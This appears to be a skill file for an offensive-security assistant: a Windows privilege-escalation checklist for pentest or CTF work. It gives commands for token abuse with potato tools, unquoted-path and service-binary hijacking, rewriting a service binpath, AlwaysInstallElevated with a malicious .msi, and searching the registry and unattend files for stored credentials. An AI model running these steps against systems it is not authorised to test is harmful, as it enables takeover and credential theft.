---
id: privesc-win
title: Windows privesc — service misconfig, tokens, scheduled tasks
triggers: [winpeas, icacls, sc.exe, AlwaysInstallElevated, seimpersonate, windows]
---

## Order — misconfig before kernel

1. `whoami /priv` — `SeImpersonatePrivilege` + a potato
   (PrintSpoofer/GodPotato) = SYSTEM on most modern boxes; `SeDebug`/
   `SeBackup` have their own paths.
2. Service misconfigs — the classic three:
   `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /v "c:\windows"`
   → unquoted path with spaces (`C:\Program Files\My App\svc.exe` →
   drop `C:\Program.exe`), weak service-binary perms
   (`icacls "C:\path\svc.exe"` — `Everyone:(F)` = replace it), or
   `sc.exe sdshow <svc>` writable DACL → `sc.exe config <svc> binpath=`.
3. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` +
   `schtasks /query /fo list /v | findstr /i "taskname\|run as\|exe"` —
   tasks running as SYSTEM on writable scripts.
4. `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v
   AlwaysInstallElevated` — both keys =1 → `msiexec` a malicious .msi.

## Enumerate

```powershell
winPEASany.exe            # or winpeas.bat — tee output to a file
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
net user; net localgroup administrators
dir C:\Users\ /a; type C:\Users\*\Desktop\*.txt 2>nul
```

- Stored creds before exploits: `cmdkey /list`, `reg query HKLM /f
  password /t REG_SZ /s`, unattended-install files
  (`C:\Windows\Panther\Unattend.xml`, `sysprep.inf`).
- Kernel exploits (PrintNightmare & co.) only when the version floor is
  confirmed and misconfig paths are exhausted — same rule as Linux.
